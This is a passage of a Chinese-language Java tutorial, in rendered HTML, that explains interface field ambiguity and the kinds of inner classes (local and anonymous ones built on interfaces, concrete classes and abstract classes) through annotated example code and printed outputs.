class="hljs-title class_">B</span>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">//普通属性</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">A</span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pX</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//System.out.println(x); //有问题，原因：不明确x是谁</span><br>    <span class="hljs-comment">//修改：访问接口的x使用 A.x ，访问父类的x使用 super.x .</span><br>    System.out.println(A.x+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">super</span>.x); <br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>().pX();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：0 1</p><h2 id="9-内部类（难点）"><a href="#9-内部类（难点）" class="headerlink" title="9.内部类（难点）"></a>9.内部类（难点）</h2><blockquote><p>基本介绍：</p><p>一个类的内部又完整的嵌套了另一个类结构。被嵌套的类称为内部类（inner class），嵌套其他类的类称为外部类（outer class）。是我们类的第五大成员【思考：类的五大成员是哪些?】。</p><p>内部类最大的<strong>特点</strong>就是可以<strong>直接访问私有属性</strong>，并且可以体现类与类之间的包含关系。</p></blockquote><p>基本语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span>&#123; <span class="hljs-comment">//外部类</span><br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span>&#123; <span class="hljs-comment">//内部类</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Other</span>&#123; <span class="hljs-comment">//外部其他类</span><br>&#125;<br></code></pre></td></tr></table></figure><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass01</span> &#123; <span class="hljs-comment">//外部其他类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; <span class="hljs-comment">//属性</span><br>    <span class="hljs-comment">//构造器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Outer</span><span class="hljs-params">(<span class="hljs-type">int</span> n1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.n1 = n1;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//方法</span><br>        System.out.println(<span class="hljs-string">&quot;m1()&quot;</span>);<br>    &#125;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;代码块...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span>&#123; <span class="hljs-comment">//内部类</span><br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h3><ul><li>定义在外部类局部位置上（比如方法内）：<ol><li>局部内部类（有类名）</li><li>匿名内部类（没有类名【重点】）</li></ol></li><li>定义在外部类的成员位置上<ol><li>成员内部类（没用static修饰）</li><li>静态内部类（使用static修饰）</li></ol></li></ul><h3 id="1-局部内部类"><a href="#1-局部内部类" class="headerlink" title="1.局部内部类"></a>1.局部内部类</h3><p>说明：局部内部类是定义在外部类的局部位置，比如说<strong>方法中</strong>，并且<strong>有类名</strong>。</p><ol><li><p>可以直接访问外部类的所有成员，包括私有的。</p></li><li><p><strong>不能添加访问修饰符</strong>，因为它的低位就是一个局部变量，局部变量是不能使用修饰符的。但是可以使用final修饰，因为局部变量也可以使用final。</p></li><li><p><strong>作用域</strong>：仅仅在定义它的方法或代码块中。</p></li><li><p>局部内部类–访问—&gt;外部类的成员【访问方式：直接访问】</p></li><li><p>外部类—访问—&gt;局部内部类的成员【访问方式：创建对象，在访问（注意：必须在作用域内）】</p></li><li><p>外部其他类–不能访问—&gt;局部内部类（因为局部内部类地位是一个局部变量）</p></li><li><p>如果外部类和局部内部类重名时，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问。</p><p><code>System.out.println(&quot;外部类的n2=&quot;+外部类名.this.n2);</code></p></li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">局部内部类的使用</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalInnerClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer02</span> <span class="hljs-variable">outer02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer02</span>();<br>        outer02.m1();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer02</span>&#123; <span class="hljs-comment">//外部变量</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//私有方法</span><br>        System.out.println(<span class="hljs-string">&quot;Outer02 m2()&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//方法</span><br>        <span class="hljs-comment">//1.局部内部类是定义在外部类的局部位置，通常在方法</span><br>        <span class="hljs-comment">//3.不能添加访问修饰符,但是可以使用final修饰</span><br>        <span class="hljs-comment">//4.作用域：仅仅在定义它的方法或代码块中。</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner02</span>&#123;<span class="hljs-comment">//局部内部类(本质仍然是一个类)</span><br>            <span class="hljs-comment">//2.可以直接访问外部类的所有成员，包括私有的</span><br>            <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">800</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-comment">//5.局部内部类可以直接访问外部类的成员，如下，外部类n1和m2()</span><br>                <span class="hljs-comment">//7.如果外部类和局部内部类重名时，默认遵循就近原则，</span><br>                <span class="hljs-comment">//  如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问。</span><br>                <span class="hljs-comment">//  Outer02.this 本类就是外部类的对象，即哪个对象调用了m1方法，Outer02.this就指向这个对象</span><br>                System.out.println(<span class="hljs-string">&quot;n1=&quot;</span>+n1 + <span class="hljs-string">&quot; 外部类的n1=&quot;</span>+Outer02.<span class="hljs-built_in">this</span>.n1);<br>                m2();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//6.外部类在方法中，可以创建Inner02的对象，然后调用方法即可</span><br>        <span class="hljs-type">Inner02</span> <span class="hljs-variable">inner02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner02</span>();<br>        inner02.f1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">n1</span>=<span class="hljs-number">800</span> 外部类的<span class="hljs-symbol">n1</span>=<span class="hljs-number">100</span><br>Outer<span class="hljs-number">02</span> <span class="hljs-name">m2</span><span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><p>小结：</p><p>（1）局部内部类定义在方法中&#x2F;代码块 </p><p>（2）作用域在方法体或者代码块中</p><p>（3）本质仍然是一个类</p><h3 id="2-匿名内部类（重要）"><a href="#2-匿名内部类（重要）" class="headerlink" title="2.匿名内部类（重要）"></a>2.匿名内部类（重要）</h3><p>说明：匿名内部类是定义在外部类的局部位置，比如方法中，并且没有类名。</p><p>解读：（1）本质是类 （2）内部类 （3）该类没有名字 （4）同时还是一个对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//基本语法</span><br><span class="hljs-keyword">new</span> 类或接口(参数列表)&#123;<br>  类体<br>&#125;;<br></code></pre></td></tr></table></figure><p>基于接口的匿名内部类例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    演示匿名内部类的使用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnonymousInnerClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer04</span> <span class="hljs-variable">outer04</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer04</span>();<br>        outer04.method();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer04</span>&#123; <span class="hljs-comment">//外部类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//基于接口的匿名内部类</span><br>        <span class="hljs-comment">//解析：</span><br>        <span class="hljs-comment">//1.需求：想使用接口A，并创建对象</span><br>        <span class="hljs-comment">//2.传统方式就是写一个类，实现该接口，并创建对象</span><br>        <span class="hljs-type">Tiger</span> <span class="hljs-variable">tiger</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tiger</span>();<br>        tiger.cry();<br>        <span class="hljs-comment">//3.需求是老虎/狗狗只使用一次，后面不再使用</span><br>        <span class="hljs-comment">//4.可以使用匿名内部类来简化开发</span><br>        <span class="hljs-comment">//5.tiger2的编译类型？ IA</span><br>        <span class="hljs-comment">//6.tiger2的运行类型？ 匿名内部类</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            底层会分配一个类名，例如Outer04$1</span><br><span class="hljs-comment">            class XXXX implements IA&#123;</span><br><span class="hljs-comment">                @Override</span><br><span class="hljs-comment">                public void cry() &#123;</span><br><span class="hljs-comment">                    System.out.println(&quot;老虎再一次嗷嗷叫。&quot;);&#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//7.jdk底层在创建匿名内部类Outer04$1，马上就创建了Outer04$1实例，</span><br>        <span class="hljs-comment">//  并且把地址返回给了tiger2</span><br>        <span class="hljs-comment">//8.匿名内部类使用一次，就不能再使用</span><br>        <span class="hljs-type">IA</span> <span class="hljs-variable">tiger2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IA</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;老虎再一次嗷嗷叫。&quot;</span>);<br>            &#125;<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;tiger的运行类型=&quot;</span>+tiger2.getClass());<br>        tiger2.cry();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IA</span>&#123;<span class="hljs-comment">//接口</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tiger</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IA</span>&#123; <span class="hljs-comment">//老虎类</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;老虎嗷嗷叫。&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IA</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;小狗汪汪叫。&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Father</span><span class="hljs-params">(String name)</span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>老虎嗷嗷叫。<br>tiger2的运行类型&#x3D;class com.hspedu.innerclass.Outer04$1<br>老虎再一次嗷嗷叫。</p><p>基于抽象类的匿名内部类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    演示匿名内部类的使用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnonymousInnerClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer04</span> <span class="hljs-variable">outer04</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer04</span>();<br>        outer04.method();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer04</span>&#123; <span class="hljs-comment">//外部类</span><br>    <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">....</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>        <span class="hljs-comment">//演示基于类的匿名内部类</span><br>        <span class="hljs-comment">//分析</span><br>        <span class="hljs-comment">//1.father编译类型——Father</span><br>        <span class="hljs-comment">//2.father运行类型——Outer04$2(如果不带大括号，还是Father）</span><br>        <span class="hljs-comment">//3.底层会创建匿名内部类</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            class Outer04$2 extends Father&#123;</span><br><span class="hljs-comment">                @Override</span><br><span class="hljs-comment">                public void test() &#123;</span><br><span class="hljs-comment">                    System.out.println(&quot;匿名内部类重写了test方法&quot;);</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//4.同时也返回了 匿名内部类Outer04$2的对象</span><br>        <span class="hljs-comment">//5.注意(&quot;jack&quot;)参数列表会传递给构造器</span><br>        <span class="hljs-type">Father</span> <span class="hljs-variable">father</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>(<span class="hljs-string">&quot;jack&quot;</span>)&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;匿名内部类重写了test方法&quot;</span>);<br>            &#125;<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;father对象的运行类型=&quot;</span>+father.getClass());<br>        father.test();<br><br>        <span class="hljs-comment">//基于抽象类的匿名内部类</span><br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">animal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;小狗吃骨头...&quot;</span>);<br>            &#125;<br>        &#125;;<br>        animal.eat();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">....</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Father</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;接收到了name&quot;</span>+name);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>father对象的运行类型&#x3D;class com.hspedu.innerclass.Outer04$2<br>匿名内部类重写了test方法<br>小狗吃骨头…</p><h4 id="使用细节-1"><a href="#使用细节-1" class="headerlink" title="使用细节"></a>使用细节</h4><ol><li><p>匿名内部类既是一个类的定义，同时他本身也是一个对象。</p><p>从语法上看，<strong>既有定义类的特征，也有创建对象的特征。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnoymouslnnerClassDetail</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer05</span> <span class="hljs-variable">outer05</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer05</span>();<br>        outer05.f1();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer05</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">99</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;匿名内部类重写了 hi方法&quot;</span>);<br>            &#125;<br>        &#125;;<br>        p.hi();<span class="hljs-comment">//动态绑定</span><br><br>        <span class="hljs-comment">//也可以直接调用，匿名内部类也是返回对象</span><br>        <span class="hljs-comment">//class匿名内部类 extends Person()&#123;&#125;</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;匿名内部类重写了 hi方法,哈哈哈&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ok</span><span class="hljs-params">(String str)</span> &#123;<br>                <span class="hljs-built_in">super</span>.ok(str);<br>            &#125;<br>        &#125;.ok(<span class="hljs-string">&quot;jack&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<span class="hljs-comment">//类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person hi()&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ok</span><span class="hljs-params">(String str)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person ok()&quot;</span>+str);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//抽象类/接口..</span><br></code></pre></td></tr></table></figure><p>输出：</p><p>匿名内部类重写了 hi方法<br>Person ok()jack</p></li><li><p>可以直接访问外部类的所有成员，包括私有的</p></li><li><p><strong>不能添加访问修饰符</strong>，因为它的地位就是一个局部变量</p></li><li><p>作用域：仅仅在定义它的方法和代码块</p></li><li><p>匿名内部类–访问—&gt;外部类成员（直接访问）</p></li><li><p>外部其他类–不能访问—&gt;匿名内部类（因为 匿名内部类地位就是一个局部变量）</p></li><li><p>如果外部类和匿名内部类的成员<strong>重名时</strong>，匿名访问类的话，默认<strong>就近原则</strong>。</p><p>如果想要访问外部类的成员时，则可以使用（外部类名.this.成员）去访问</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnoymouslnnerClassDetail</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer05</span> <span class="hljs-variable">outer05</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer05</span>();<br>        outer05.f1();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title 